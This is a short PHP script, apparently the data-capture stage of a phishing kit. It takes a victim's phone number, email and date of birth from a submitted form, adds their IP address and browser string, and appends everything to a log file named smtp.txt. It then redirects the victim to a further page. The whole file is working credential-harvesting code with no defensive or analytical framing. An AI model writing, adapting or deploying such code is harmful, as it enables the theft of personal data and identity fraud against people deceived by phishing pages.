<?php
$zabi = getenv("REMOTE_ADDR");
$message .= "--++-----[INFO ZODIAC]-----++--\n";
$message .= "MOB : ".$_POST['phoneNumber']."\n";
$message .= "POST : ".$_POST['epost']."\n";
$message .= "DOB : ".$_POST['ddmmaa']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $zabi\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "--------------------------------------------\n";


    $text = fopen('smtp.txt', 'a');
fwrite($text, $message);

header("Location: VALID904951986/");
?>